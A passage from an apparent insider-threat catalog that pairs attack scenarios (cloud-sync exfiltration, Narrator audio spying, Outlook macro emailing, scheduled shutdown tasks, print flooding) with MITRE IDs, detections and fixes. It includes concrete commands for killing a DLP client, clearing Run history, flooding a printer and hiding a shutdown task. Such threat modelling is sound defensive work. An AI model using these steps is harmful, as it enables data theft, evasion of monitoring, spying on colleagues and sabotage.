- **Solution**: Enforce proper file-level permissions
- **Tags**: File Discovery, Explorer, Indexing

## Using PDF Print to Save Confidential Info

- **Attack Type**: Misuse of Legitimate Tools
- **Target**: Application UI
- **Vulnerability**: Print-to-PDF not monitored
- **MITRE**: T1565.001 (Stored Data Manipulation)
- **Impact**: Stealthy report stealing
- **Tools**: Microsoft Print to PDF
- **Scenario**: Insider prints internal dashboards, invoices, and docs to PDF using "Microsoft Print to PDF" and stores them.
- **Attack Steps**: Step 1: Opens internal dashboard/report in browser or app. Step 2: Selects Print > "Microsoft Print to PDF". Step 3: Saves file in personal folder like D:\Reports. Step 4: Later compresses files and emails them. Step 5: Deletes recent document traces.
- **Detection**: Track PDF print jobs and destinations
- **Solution**: Restrict sensitive print options
- **Tags**: PDF, Print to File, Report Theft

## Browser Extension with Spy Capabilities

- **Attack Type**: Misuse of Legitimate Tools
- **Target**: Browser
- **Vulnerability**: No browser extension restrictions
- **MITRE**: T1176 (Browser Extensions)
- **Impact**: Real-time spying on user activity
- **Tools**: Malicious Chrome/Firefox Extension
- **Scenario**: Insider installs a browser extension that records visited sites, clipboard data, and sends it out.
- **Attack Steps**: Step 1: Installs custom or shady browser extension from developer mode. Step 2: Extension silently tracks URLs, keystrokes, clipboard content. Step 3: Sends data to a remote endpoint controlled by insider. Step 4: Insider collects data from external endpoint.
- **Detection**: Restrict extension installs, monitor browser activity
- **Solution**: Use browser policies, allow-list extensions
- **Tags**: Spy Extension, Clipboard, URLs

## Abusing Developer Tools in VS Code

- **Attack Type**: Misuse of Legitimate Tools
- **Target**: Dev Workstation
- **Vulnerability**: No terminal monitoring
- **MITRE**: T1059.001 (Command and Scripting Interpreter)
- **Impact**: Covert code/data exfiltration
- **Tools**: Visual Studio Code
- **Scenario**: Insider uses built-in terminal in VS Code to run hidden PowerShell scripts or data exfil.
- **Attack Steps**: Step 1: Opens VS Code and hits Ctrl + ``  to open terminal. Step 2: Runs hidden PowerShell like Compress-Archive or Invoke-WebRequest. Step 3: Scripts exfiltrate file content via HTTP POST or upload to cloud. Step 4: Terminal looks like normal dev activity.
- **Detection**: Monitor VS Code terminal commands
- **Solution**: Disable terminal or restrict scripting
- **Tags**: VS Code, PowerShell, Dev Abuse

## Scheduled Email via VBA Timer

- **Attack Type**: Misuse of Legitimate Tools
- **Target**: Email Client
- **Vulnerability**: No macro control in Outlook
- **MITRE**: T1204.002 (Malicious File Execution)
- **Impact**: Delayed email exfiltration
- **Tools**: Outlook VBA
- **Scenario**: Insider uses Outlook VBA macro with a timer to send emails with attachments after hours.
- **Attack Steps**: Step 1: Opens Outlook → Alt+F11 to access VBA editor. Step 2: Adds timer-based macro to run at 6 PM. Step 3: Macro auto-attaches confidential.xlsx and sends it to personal email. Step 4: Insider leaves work, email sends silently. Step 5: Email is cleared from sent box later.
- **Detection**: Monitor scheduled emails/macros
- **Solution**: Disable VBA in Outlook
- **Tags**: VBA, Outlook, Timed Attack

## Abusing Local Web Servers (XAMPP)

- **Attack Type**: Misuse of Legitimate Tools
- **Target**: Office PC
- **Vulnerability**: No restriction on localhost servers
- **MITRE**: T1056.004 (Credential Phishing)
- **Impact**: Internal phishing and trap
- **Tools**: XAMPP, Localhost Server
- **Scenario**: Insider runs a local PHP web server to stage exfiltration tools or fake login pages.
- **Attack Steps**: Step 1: Installs XAMPP on office PC. Step 2: Places fake login page in htdocs (e.g., intranet_login.html). Step 3: Traps colleague into entering credentials on this page. Step 4: Saves data in local logs.txt. Step 5: Later accesses logs and deletes server folder.
- **Detection**: Monitor HTTP servers on endpoints
- **Solution**: Block unauthorized local servers
- **Tags**: XAMPP, Phishing, Local Server

## Misuse of Robocopy for Mass Data Copy

- **Attack Type**: Misuse of Legitimate Tools
- **Target**: File Server
- **Vulnerability**: Lack of file copy logging
- **MITRE**: T1105 (Ingress Tool Transfer)
- **Impact**: Large-scale silent data theft
- **Tools**: Robocopy
- **Scenario**: Insider uses robocopy, a Windows tool, to silently copy large folders of internal data to external storage.
- **Attack Steps**: Step 1: Insider opens Command Prompt. Step 2: Runs command like robocopy C:\Sensitive D:\Backup /E /ZB /NP to copy all data to a USB or external folder. Step 3: Files are copied with timestamps preserved and no popups. Step 4: Insider removes the USB drive or syncs the folder later.
- **Detection**: Monitor robocopy usage
- **Solution**: Block robocopy for non-admins
- **Tags**: Robocopy, File Copy, USB

## Dropbox Sync for Covert Exfiltration

- **Attack Type**: Misuse of Legitimate Tools
- **Target**: Workstation
- **Vulnerability**: No cloud sync restriction
- **MITRE**: T1537 (Transfer Data to Cloud Account)
- **Impact**: Continuous exfiltration
- **Tools**: Dropbox
- **Scenario**: Insider installs Dropbox to sync sensitive internal folders to personal cloud.
- **Attack Steps**: Step 1: Installs Dropbox client and logs in to personal account. Step 2: Sets sync folder as C:\Projects. Step 3: Files are auto-uploaded to cloud in background. Step 4: Insider downloads files from home later. Step 5: Uninstalls Dropbox after job is done.
- **Detection**: Alert on unknown cloud sync apps
- **Solution**: Restrict cloud apps via GPO
- **Tags**: Dropbox, Cloud Exfil

## Exploiting Print Screen Key

- **Attack Type**: Misuse of Legitimate Tools
- **Target**: Desktop
- **Vulnerability**: Screenshot logging not enabled
- **MITRE**: T1113 (Screen Capture)
- **Impact**: Visual data leakage
- **Tools**: Keyboard, Paint
- **Scenario**: Insider repeatedly presses “Print Screen” and pastes sensitive screenshots into Paint to save them as images.
- **Attack Steps**: Step 1: Insider opens internal documents or dashboards. Step 2: Presses PrtScn key to take a full screenshot. Step 3: Opens Paint, pastes the image, and saves as .png. Step 4: Repeats for multiple screens. Step 5: Transfers files to personal device or email.
- **Detection**: Detect Print Screen usage
- **Solution**: Block screenshot keys in sensitive areas
- **Tags**: Screen Capture, Paint

## Misuse of Power BI Export Features

- **Attack Type**: Misuse of Legitimate Tools
- **Target**: BI Platform
- **Vulnerability**: Export feature unmonitored
- **MITRE**: T1119 (Automated Collection)
- **Impact**: Bulk analytics data leak
- **Tools**: Power BI, Excel
- **Scenario**: Insider uses Power BI’s “Export to Excel” feature to dump internal dashboard data.
- **Attack Steps**: Step 1: Opens a confidential Power BI report. Step 2: Clicks on "Export Data" → Excel. Step 3: File downloads with backend table data. Step 4: Insider opens the Excel file, reviews content. Step 5: Emails it to personal address or saves on USB.
- **Detection**: Monitor data export activity
- **Solution**: Restrict export permissions
- **Tags**: Power BI, Excel Export

## Using Word’s Inspect Document to Reveal Hidden Info

- **Attack Type**: Misuse of Legitimate Tools
- **Target**: Office Docs
- **Vulnerability**: Metadata not cleaned
- **MITRE**: T1207 (Rogue Metadata)
- **Impact**: Leakage of private/internal comments
- **Tools**: Microsoft Word
- **Scenario**: Insider uses Word’s "Inspect Document" feature to extract hidden comments, revisions, or author info.
- **Attack Steps**: Step 1: Opens Word file received from manager or HR. Step 2: Goes to File → Info → Check for Issues → Inspect Document. Step 3: Reveals tracked changes, author names, previous edits. Step 4: Saves sensitive info found and shares externally.
- **Detection**: Use auto metadata stripping
- **Solution**: Educate users on document hygiene
- **Tags**: Word, Metadata, Inspect

## Wireshark for Capturing Local Traffic

- **Attack Type**: Misuse of Legitimate Tools
- **Target**: LAN Segment
- **Vulnerability**: No network monitoring
- **MITRE**: T1040 (Network Sniffing)
- **Impact**: Credential and file theft
- **Tools**: Wireshark
- **Scenario**: Insider installs Wireshark and captures network traffic for credentials, file shares, or tokens.
- **Attack Steps**: Step 1: Installs Wireshark with admin access. Step 2: Starts packet capture on local Ethernet/Wi-Fi interface. Step 3: Filters packets for http, ftp, smb, or credentials. Step 4: Extracts login data, tokens, or downloads files in transit. Step 5: Saves capture file and exits Wireshark.
- **Detection**: Detect sniffing tools on endpoints
- **Solution**: Disable promiscuous mode, use encrypted protocols
- **Tags**: Wireshark, Packet Capture

## Calendar Exploitation for Hidden Notes

- **Attack Type**: Misuse of Legitimate Tools
- **Target**: Email & Calendar
- **Vulnerability**: Calendar syncing not monitored
- **MITRE**: T1114 (Email Collection)
- **Impact**: Hidden data exfiltration via calendar
- **Tools**: Outlook Calendar
- **Scenario**: Insider adds sensitive notes to Outlook calendar entries and syncs them with personal devices.
- **Attack Steps**: Step 1: Opens Outlook → Calendar → New Event. Step 2: Adds sensitive notes in the description box (e.g., passwords, plan details). Step 3: Saves event to synced personal device calendar. Step 4: Reads data later on mobile or web.
- **Detection**: Monitor calendar descriptions
- **Solution**: Block calendar sync to external devices
- **Tags**: Outlook, Calendar, Data Notes

## Abusing MS Word AutoSave to Cloud

- **Attack Type**: Misuse of Legitimate Tools
- **Target**: Office Docs
- **Vulnerability**: AutoSave linked to personal cloud
- **MITRE**: T1537
- **Impact**: Continuous file sync
- **Tools**: Microsoft Word, OneDrive
- **Scenario**: Insider enables AutoSave in Word to auto-upload files to OneDrive without manual export.
- **Attack Steps**: Step 1: Opens confidential file in Word. Step 2: Clicks AutoSave → Selects personal OneDrive location. Step 3: Every edit is synced to the cloud. Step 4: File is later accessed on personal laptop. Step 5: Insider deletes the cloud file afterward.
- **Detection**: Block external OneDrive access
- **Solution**: Disable cloud-linked AutoSave
- **Tags**: Word, AutoSave, OneDrive

## Chrome Autofill to Steal Stored Info

- **Attack Type**: Misuse of Legitimate Tools
- **Target**: Shared PC
- **Vulnerability**: Shared profiles with saved data
- **MITRE**: T1555.003
- **Impact**: PII theft via autofill
- **Tools**: Google Chrome
- **Scenario**: Insider uses Chrome’s autofill feature on shared systems to grab stored contact, payment, or address info.
- **Attack Steps**: Step 1: Opens form on any site. Step 2: Clicks into input fields like Name, Email, Card. Step 3: Autofill shows saved data. Step 4: Copies and pastes the data into a file. Step 5: Deletes browser history after.
- **Detection**: Use profile lock, disable autofill
- **Solution**: Clear autofill data, enforce browser hygiene
- **Tags**: Chrome, Autofill, PII

## Misusing Windows Narrator to Spy on Activity

- **Attack Type**: Misuse of Legitimate Tools
- **Target**: Nearby PC
- **Vulnerability**: Narrator not logged or restricted
- **MITRE**: T1201 (Audio Capture)
- **Impact**: Surveillance via accessibility tool
- **Tools**: Windows Narrator
- **Scenario**: Insider turns on Windows Narrator and positions PC near another to capture audio of typed content.
- **Attack Steps**: Step 1: Press Ctrl + Win + Enter to turn on Narrator. Step 2: Set Narrator to read everything typed on screen. Step 3: Places the machine near the target user. Step 4: Listens as Narrator reads out passwords, messages, or forms. Step 5: Records audio via phone or tool.
- **Detection**: Detect Narrator use outside accessibility
- **Solution**: Restrict Narrator access for non-disabled users
- **Tags**: Narrator, Audio Spy

## Xbox Game Bar Screen Recording

- **Attack Type**: Misuse of Legitimate Tools
- **Target**: Office System
- **Vulnerability**: No monitoring of built-in tools
- **MITRE**: T1113 (Screen Capture)
- **Impact**: Full video of sensitive screens
- **Tools**: Xbox Game Bar
- **Scenario**: Insider uses Windows Xbox Game Bar to screen-record dashboards and internal tools.
- **Attack Steps**: Step 1: Press Win + G to open Xbox Game Bar. Step 2: Click "Capture" → "Start Recording". Step 3: Open internal tools, emails, chats. Step 4: Stop recording after desired duration. Step 5: Video file saved in C:\Users\<Name>\Videos\Captures. Step 6: Copy to USB or email to self.
- **Detection**: Log Game Bar use; detect new video files
- **Solution**: Disable Xbox Game Bar in group policies
- **Tags**: Game Bar, Screen Recording, Windows

## Exploiting Sticky Notes for Persistent Data

- **Attack Type**: Misuse of Legitimate Tools
- **Target**: Desktop App
- **Vulnerability**: Sticky Notes sync allowed
- **MITRE**: T1114
- **Impact**: Sync-based passive exfiltration
- **Tools**: Windows Sticky Notes
- **Scenario**: Insider stores passwords and sensitive notes in Sticky Notes synced to personal Microsoft account.
- **Attack Steps**: Step 1: Opens Sticky Notes app. Step 2: Creates a new note with credentials or plans. Step 3: Notes sync to personal MS account linked to Sticky Notes. Step 4: Accesses notes from home via https://www.onenote.com/stickynotes.
- **Detection**: Disable Sticky Note sync
- **Solution**: Block personal account sign-in on work PCs
- **Tags**: StickyNotes, Cloud Sync

## Using Windows Narrator for Keystroke Echo

- **Attack Type**: Misuse of Legitimate Tools
- **Target**: Colleague's PC
- **Vulnerability**: Accessibility tools unmonitored
- **MITRE**: T1201 (Audio Capture)
- **Impact**: Credential spying through speech
- **Tools**: Narrator, Audio Recorder
- **Scenario**: Insider enables Narrator on a coworker's machine so keystrokes are read aloud and recorded.
- **Attack Steps**: Step 1: On target PC, press Ctrl + Win + Enter to enable Narrator. Step 2: Set Narrator to read “Characters and Words”. Step 3: Leave PC unattended near microphone or phone recording audio. Step 4: Collect recording after user types passwords/messages.
- **Detection**: Alert on Narrator activation
- **Solution**: Limit Narrator to approved accounts
- **Tags**: Narrator, Accessibility Abuse

## Exploiting MS Teams File Sharing

- **Attack Type**: Misuse of Legitimate Tools
- **Target**: Collaboration Tool
- **Vulnerability**: Guest access not monitored
- **MITRE**: T1537
- **Impact**: Internal data leakage via legit file sharing
- **Tools**: Microsoft Teams
- **Scenario**: Insider uses Teams to send sensitive internal files to external collaborators or fake accounts.
- **Attack Steps**: Step 1: Opens chat with external guest or dummy account. Step 2: Uploads confidential PDF, Excel, or ZIP. Step 3: External party downloads instantly. Step 4: Insider deletes chat or file from view.
- **Detection**: Monitor Teams DLP logs
- **Solution**: Limit external sharing and enforce file tagging
- **Tags**: Teams, File Share, Guest Abuse

## Leveraging Zoom Screen Share to Leak Data

- **Attack Type**: Misuse of Legitimate Tools
- **Target**: Laptop
- **Vulnerability**: Screen sharing not restricted
- **MITRE**: T1113
- **Impact**: Live data leak via video call
- **Tools**: Zoom
- **Scenario**: Insider shares sensitive documents on Zoom call with fake attendee or personal device logged in.
- **Attack Steps**: Step 1: Starts a Zoom call, invites personal device (phone/laptop). Step 2: Clicks "Share Screen" and selects sensitive window (dashboard, spreadsheet). Step 3: Personal device records or screenshots the data. Step 4: Ends call and clears recent meeting history.
- **Detection**: Restrict screen sharing permissions
- **Solution**: Monitor screen sharing events
- **Tags**: Zoom, Screen Share, Stealth

## Using Command Prompt to Compress Sensitive Data

- **Attack Type**: Misuse of Legitimate Tools
- **Target**: File Server
- **Vulnerability**: No alerts on ZIP creation
- **MITRE**: T1560.001 (Archive Collected Data)
- **Impact**: Bundled data leak
- **Tools**: CMD, Windows ZIP
- **Scenario**: Insider compresses sensitive folders using compact.exe or ZIP before stealth transfer.
- **Attack Steps**: Step 1: Opens Command Prompt. Step 2: Runs tar -a -c -f backup.zip ConfidentialFolder. Step 3: Zip file is saved in Downloads or USB. Step 4: Email or upload the zip to cloud.
- **Detection**: Monitor ZIP and TAR creation
- **Solution**: Use DLP to detect compression
- **Tags**: CMD, ZIP, Archive

## Google Sheets with App Script for Stealth Logs

- **Attack Type**: Misuse of Legitimate Tools
- **Target**: Google Workspace
- **Vulnerability**: Scripts in sheets not reviewed
- **MITRE**: T1059
- **Impact**: Covert exfil via cloud document
- **Tools**: Google Sheets, Google Apps Script
- **Scenario**: Insider uses Google Sheets with Apps Script to log copied content and auto-send to their email.
- **Attack Steps**: Step 1: Opens Google Sheets → Extensions → Apps Script. Step 2: Writes script to detect pasted content and forward it via email. Step 3: Shares sheet with teammates, lets them use it. Step 4: Insider receives data secretly by email.
- **Detection**: Restrict Apps Script execution
- **Solution**: Enforce review before use
- **Tags**: GSheets, App Script, Covert Exfil

## OneNote with Embedded Files for Hidden Theft

- **Attack Type**: Misuse of Legitimate Tools
- **Target**: Office Notebook
- **Vulnerability**: Sync enabled for personal accounts
- **MITRE**: T1537
- **Impact**: Stealth exfil using embedded note objects
- **Tools**: OneNote Desktop/Mobile
- **Scenario**: Insider embeds sensitive files into OneNote pages and accesses from synced mobile device.
- **Attack Steps**: Step 1: Opens OneNote and creates new note. Step 2: Clicks "Insert" → "File Attachment". Step 3: Adds internal report, spreadsheet, or password dump. Step 4: Syncs notebook with personal Microsoft account. Step 5: Accesses it from phone or web.
- **Detection**: Block personal OneNote sync
- **Solution**: Monitor OneNote storage content
- **Tags**: OneNote, Attachments

## Windows Taskkill to Disable Monitoring Tools

- **Attack Type**: Misuse of Legitimate Tools
- **Target**: Workstation
- **Vulnerability**: No alert on process kill
- **MITRE**: T1562.001 (Disable or Modify Tools)
- **Impact**: Blind zone during exfiltration
- **Tools**: Windows CMD, Task Manager
- **Scenario**: Insider uses taskkill to disable security or logging tools before performing malicious activity.
- **Attack Steps**: Step 1: Opens CMD as user/admin. Step 2: Runs tasklist to list all running processes. Step 3: Identifies endpoint monitor like Sysmon.exe or DLPClient.exe. Step 4: Runs taskkill /IM DLPClient.exe /F. Step 5: Proceeds to access or transfer files.
- **Detection**: Monitor critical process stops
- **Solution**: Restrict taskkill via policies
- **Tags**: Taskkill, Evasion

## Windows Run History to Bypass Detection

- **Attack Type**: Misuse of Legitimate Tools
- **Target**: Windows OS
- **Vulnerability**: Run history not monitored
- **MITRE**: T1070.004
- **Impact**: Evasion of command history
- **Tools**: Windows Run Box, Registry Editor
- **Scenario**: Insider uses known Run commands to launch tools and deletes evidence using registry.
- **Attack Steps**: Step 1: Press Win + R, type cmd, powershell, or app path. Step 2: After exfil or action, opens regedit. Step 3: Navigates to HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU. Step 4: Deletes entries to clear history.
- **Detection**: Monitor Run key changes
- **Solution**: Lock registry or log deletions
- **Tags**: Run Box, Registry Evasion

## SQLite Database Dump from App

- **Attack Type**: Misuse of Legitimate Tools
- **Target**: App Data Folder
- **Vulnerability**: App data exposed unencrypted
- **MITRE**: T1555 (Credentials from Password Stores)
- **Impact**: Token & credential dump
- **Tools**: SQLite Viewer, Notepad++
- **Scenario**: Insider copies .sqlite database from app folders to extract saved credentials or tokens.
- **Attack Steps**: Step 1: Opens C:\Users\<user>\AppData\Local\... for apps like browsers, password managers, etc. Step 2: Finds .sqlite or .db file. Step 3: Opens file in SQLite Viewer. Step 4: Looks for tables like logins, tokens, users. Step 5: Copies extracted data into a text file.
- **Detection**: Monitor file access in sensitive folders
- **Solution**: Encrypt local storage, restrict file permissions
- **Tags**: SQLite, Token Dump

## Zapier Email Automation for Data Theft

- **Attack Type**: Misuse of Legitimate Tools
- **Target**: Email Automation
- **Vulnerability**: Zapier automation not monitored
- **MITRE**: T1537 (Transfer Data to Cloud Account)
- **Impact**: Covert forwarding of corporate emails
- **Tools**: Zapier, Gmail
- **Scenario**: Insider uses Zapier to forward work emails or attachments to their personal Gmail.
- **Attack Steps**: Step 1: Logs into Zapier and creates a new Zap. Step 2: Trigger: “New Email in Outlook”. Step 3: Action: “Send Email via Gmail to me@personal.com”. Step 4: Connects personal Gmail. Step 5: Any matching internal mail is auto-forwarded.
- **Detection**: Monitor Zapier/IFTTT logins
- **Solution**: Block unauthorized automation tool use
- **Tags**: Zapier, Email Leak

## QR Code Generator for Malicious URLs

- **Attack Type**: Misuse of Legitimate Tools
- **Target**: Office Materials
- **Vulnerability**: QR content not verified
- **MITRE**: T1566.002 (Spearphishing Link)
- **Impact**: Phishing via disguised QR
- **Tools**: Online QR Code Generator
- **Scenario**: Insider uses QR generator to embed phishing links on shared docs or printouts.
- **Attack Steps**: Step 1: Goes to free QR generator site. Step 2: Inputs phishing/malicious internal URL. Step 3: Generates QR and pastes into Word docs, presentations, or posters. Step 4: Shares or prints document internally. Step 5: Users scan QR and open the URL unknowingly.
- **Detection**: Scan QR content before distribution
- **Solution**: Educate on QR phishing risks
- **Tags**: QR Code, Phishing

## Misusing VPN Client for Lateral Access

- **Attack Type**: Misuse of Legitimate Tools
- **Target**: Internal Network
- **Vulnerability**: VPN + remote control combo unmonitored
- **MITRE**: T1021 (Remote Services)
- **Impact**: Externalization of internal access
- **Tools**: VPN Client, TeamViewer
- **Scenario**: Insider connects VPN at home to access internal tools, shares credentials with outsider.
- **Attack Steps**: Step 1: Logs into corporate VPN. Step 2: Runs remote control software (e.g., TeamViewer). Step 3: Shares session ID/password with external person. Step 4: External user accesses internal resources via insider’s session. Step 5: Insider disables software post-session.
- **Detection**: Alert on remote desktop tools during VPN
- **Solution**: Restrict external sessions while on VPN
- **Tags**: VPN, Remote Access, Abuse

## Webcam Monitoring with OBS Studio

- **Attack Type**: Misuse of Legitimate Tools
- **Target**: Conference Room
- **Vulnerability**: No webcam activity alerts
- **MITRE**: T1125 (Video Capture)
- **Impact**: Surveillance of people/screens
- **Tools**: OBS Studio
- **Scenario**: Insider uses OBS Studio to record activity of others using webcam feed without their knowledge.
- **Attack Steps**: Step 1: Installs OBS Studio on their or nearby device. Step 2: Adds video input source → Selects connected webcam. Step 3: Starts silent recording. Step 4: Captures meetings, on-screen activity, or physical documents. Step 5: Stops and saves video file.
- **Detection**: Monitor webcam activity logs
- **Solution**: Use webcam covers, alert video tool use
- **Tags**: OBS, Webcam Spy

## Misuse of Voice Typing in Google Docs

- **Attack Type**: Misuse of Legitimate Tools
- **Target**: Office Docs
- **Vulnerability**: Voice typing use not restricted
- **MITRE**: T1123 (Audio Capture)
- **Impact**: Real-time meeting transcript theft
- **Tools**: Google Docs
- **Scenario**: Insider uses "Voice Typing" feature to transcribe sensitive conversations.
- **Attack Steps**: Step 1: Opens Google Docs → Tools → Voice Typing. Step 2: Sits near speaker during meeting or phone call. Step 3: Clicks mic icon and records full conversation. Step 4: Transcribed content appears live in document. Step 5: Saves and downloads it from Google Drive.
- **Detection**: Monitor Docs feature usage
- **Solution**: Disable mic access in cloud tools
- **Tags**: Google Docs, Voice Spy

## Inserting Macro in PowerPoint

- **Attack Type**: Misuse of Legitimate Tools
- **Target**: Presentation File
- **Vulnerability**: Macro use not audited in PPT
- **MITRE**: T1203 (Exploitation for Client Execution)
- **Impact**: Auto data leak via presentation
- **Tools**: MS PowerPoint VBA
- **Scenario**: Insider embeds macro in presentation that auto-emails hidden data on open.
- **Attack Steps**: Step 1: Opens PowerPoint → Developer Tab → Visual Basic. Step 2: Inserts macro that runs SendObject or email trigger. Step 3: Embeds hidden sheet or object containing data. Step 4: Saves and sends deck to internal user. Step 5: On open, macro executes and sends email.
- **Detection**: Block macro use in Office files
- **Solution**: Scan for embedded macros
- **Tags**: PPT, Macro, Auto Email

## Screenshare via Chrome Remote Desktop

- **Attack Type**: Misuse of Legitimate Tools
- **Target**: Workstation
- **Vulnerability**: Chrome remote access not blocked
- **MITRE**: T1021.001
- **Impact**: Off-site access to internal machine
- **Tools**: Chrome Remote Desktop
- **Scenario**: Insider sets up Chrome Remote Desktop to access PC remotely and extract files.
- **Attack Steps**: Step 1: Installs Chrome Remote Desktop Extension. Step 2: Logs in with Google Account and sets PIN. Step 3: Enables remote access for this device. Step 4: From home, uses another device to log in remotely. Step 5: Copies sensitive files to personal cloud/drive.
- **Detection**: Block remote access extensions
- **Solution**: Monitor Chrome Remote logins
- **Tags**: Remote Desktop, Chrome

## Using AutoHotKey for Repetitive Actions

- **Attack Type**: Misuse of Legitimate Tools
- **Target**: Desktop App
- **Vulnerability**: AHK use unmonitored
- **MITRE**: T1056 (Input Capture)
- **Impact**: Auto-capture without presence
- **Tools**: AutoHotKey
- **Scenario**: Insider uses AHK script to automate timed screen captures or keystrokes while away.
- **Attack Steps**: Step 1: Installs AHK on PC. Step 2: Writes script like: Send ^+{PRTSC} every 10 min. Step 3: Script runs silently in background, saving images. Step 4: Insider reviews captures at end of day. Step 5: Deletes logs or uploads to cloud.
- **Detection**: Detect scheduled screen capture
- **Solution**: Restrict scripting tools via GPO
- **Tags**: AutoHotKey, Timed Screenshot

## Misuse of Power Automate for File Exfiltration

- **Attack Type**: Misuse of Legitimate Tools
- **Target**: Cloud Automation
- **Vulnerability**: Power Automate access unrestricted
- **MITRE**: T1020 (Automated Exfiltration)
- **Impact**: Continuous data leak via automation
- **Tools**: Microsoft Power Automate
- **Scenario**: Insider builds a Power Automate flow to upload internal files to personal OneDrive or Gmail.
- **Attack Steps**: Step 1: Opens https://flow.microsoft.com. Step 2: Creates flow: “When file is added to Folder X” → “Send email to personal@gmail.com”. Step 3: Monitors upload folder via synced PC. Step 4: Files are auto-sent to email or stored externally. Step 5: Deletes flow after use.
- **Detection**: Alert on external email triggers
- **Solution**: Limit personal connector usage
- **Tags**: Power Automate, File Leak

## USB Firmware Tampering

- **Attack Type**: Hardware Sabotage
- **Target**: Workstation
- **Vulnerability**: Lack of USB security policy
- **MITRE**: T1200 (Hardware Additions)
- **Impact**: System crash, data corruption
- **Tools**: Rubber Ducky, Custom USB payload
- **Scenario**: A disgruntled employee plants a malicious USB device that damages systems when plugged in.
- **Attack Steps**: Step 1: Purchase a cheap USB with programmable firmware. Step 2: Use a pre-built tool like Rubber Ducky to write a script that shuts down the system or deletes files. Step 3: Disguise the USB with a company label to make it look legitimate. Step 4: Drop it in common areas like the break room or plug it into unattended machines. Step 5: Once connected, the script runs automatically causing system crashes.
- **Detection**: USB monitoring tools, Endpoint detection
- **Solution**: Block USBs via policy, employee awareness
- **Tags**: sabotage, usb, physical access

## Scripted Printer Attack

- **Attack Type**: Denial of Service
- **Target**: Network Printer
- **Vulnerability**: Open access to shared resources
- **MITRE**: T1499 (Endpoint Denial of Service)
- **Impact**: Operational delay
- **Tools**: Batch Scripts, Printer Queue Tools
- **Scenario**: Employee floods the printer with junk jobs, halting operations during audits.
- **Attack Steps**: Step 1: Open Notepad and write a small batch file that sends 1000 print jobs. Step 2: Example script: for /L %%i in (1,1,1000) do (notepad /p test.txt) Step 3: Save as .bat file. Step 4: Double-click it while connected to office network printer. Step 5: Printer jams with print jobs and halts others’ use.
- **Detection**: Monitor print queues, unusual activity
- **Solution**: Printer access restrictions, queue limits
- **Tags**: printer, DoS, internal misuse

## Scheduled Task Bomb

- **Attack Type**: Scheduled Sabotage
- **Target**: Workstation
- **Vulnerability**: Lack of task auditing
- **MITRE**: T1053 (Scheduled Task)
- **Impact**: Repeated disruptions
- **Tools**: Windows Task Scheduler
- **Scenario**: Ex-employee schedules shutdowns before resigning, affecting post-departure operations.
- **Attack Steps**: Step 1: On your office PC, search “Task Scheduler” from start menu. Step 2: Create a new task with name like “Update Checker”. Step 3: Set trigger to activate daily at 12 PM. Step 4: In the “Action”, write script to shut down PC (shutdown -s -t 0). Step 5: Set to run with highest privileges and hide the task. Step 6: Leave company. Computers shut down every day post-resignation.
- **Detection**: Audit tasks, system logs
- **Solution**: Regular audit of scheduled tasks
- **Tags**: windows, insider sabotage

## Database Tampering with Dummy Data

- **Attack Type**: Data Sabotage
- **Target**: Database
- **Vulnerability**: Weak access control, no change tracking
- **MITRE**: T1565.001 (Stored Data Manipulation)
- **Impact**: False records, decision-making errors
- **Tools**: SQL GUI Tools (e.g., phpMyAdmin, DBeaver)
- **Scenario**: Data entry employee replaces customer data with fake entries.
- **Attack Steps**: Step 1: Open database interface used in your company. Step 2: Search for customer table or sales records. Step 3: Instead of deleting, slowly replace data like names, emails with fake ones. Step 4: Change small number daily to avoid detection. Step 5: Within a month, reporting and operations are unreliable.
- **Detection**: Log comparison, anomaly detection
- **Solution**: Use audit trails, role-based access
- **Tags**: data entry, sabotage, mysql

## Network Cable Disconnection

- **Attack Type**: Physical Network Sabotage
- **Target**: Network Switch
- **Vulnerability**: No video surveillance or physical logs
- **MITRE**: T1485 (Data Destruction), Physical Access
- **Impact**: Temporary network outages, confusion
- **Tools**: None
- **Scenario**: Tech staff quietly unplugs critical network cables causing intermittent outages.
- **Attack Steps**: Step 1: Identify critical server/network room (e.g., where internet/router/switches are located). Step 2: Visit during low activity hours (like lunch). Step 3: Unplug a few Ethernet cables (especially for uplink ports or routers). Step 4: If environment is noisy (fans), people won’t hear connection drop. Step 5: Plug them back after a while to confuse IT with intermittent failures.
- **Detection**: Monitor port connectivity logs
- **Solution**: Camera surveillance, lock server room
- **Tags**: network, insider threat, sabotage

## Fake Antivirus Pop-up Loop

- **Attack Type**: Psychological Denial
- **Target**: Workstation
- **Vulnerability**: User permission to write to startup
- **MITRE**: T1491.001 (Defacement)
- **Impact**: Panic, productivity loss
- **Tools**: AutoHotKey, Browser Fullscreen Scripts
- **Scenario**: Employee causes panic by showing fake virus pop-ups repeatedly.
- **Attack Steps**: Step 1: Write a script using AutoHotKey that opens a browser window in fullscreen with a fake virus alert image. Step 2: Set the script to run at login. Step 3: Copy the script to multiple user startup folders. Step 4: When users log in, the alert shows up, and they panic or call IT. Step 5: IT wastes time checking systems for nonexistent threats.
- **Detection**: Manual inspection, anomaly in startup items
- **Solution**: Group policy restrictions, user awareness
- **Tags**: psychology, fear-based, insider

## Critical Document Deletion

- **Attack Type**: Data Destruction
- **Target**: Shared Folder
- **Vulnerability**: No backup policy or file access logs
- **MITRE**: T1485 (Data Destruction)
- **Impact**: Loss of critical files
- **Tools**: Windows File Explorer
- **Scenario**: Intern deletes project files just before final delivery.
- **Attack Steps**: Step 1: Locate project folder (e.g., on shared network or desktop). Step 2: Right-click and press delete or use Shift+Delete for permanent deletion. Step 3: Empty recycle bin. Step 4: Walk away quietly. Step 5: Team discovers files missing right before client deadline.
- **Detection**: Backup verification, access logs
- **Solution**: Enable version control and backups
- **Tags**: windows, file sabotage, intern

## Fake Maintenance Alert

- **Attack Type**: Service Denial
- **Target**: Communication Channel
- **Vulnerability**: No email verification
- **MITRE**: T1204 (User Execution)
- **Impact**: Work delay, confusion
- **Tools**: Email, Outlook, or Sticky Notes
- **Scenario**: Employee sends fake IT notice telling staff not to use key software during work hours.
- **Attack Steps**: Step 1: Create an official-looking email with subject like “Scheduled Maintenance Notification”. Step 2: State that a system (e.g., payroll, CRM) will crash if used between 12–3 PM. Step 3: Send from personal account or stick post-its on monitors. Step 4: Wait as people avoid using essential tools, causing delay.
- **Detection**: Email logging, fake announcement tracking
- **Solution**: Verify all IT messages via central portal
- **Tags**: spoofing, alert sabotage

## Keyboard Shortcut Misuse

- **Attack Type**: GUI Denial
- **Target**: Workstation
- **Vulnerability**: Local script permission
- **MITRE**: T1547 (Startup Item)
- **Impact**: Shutdown, user confusion
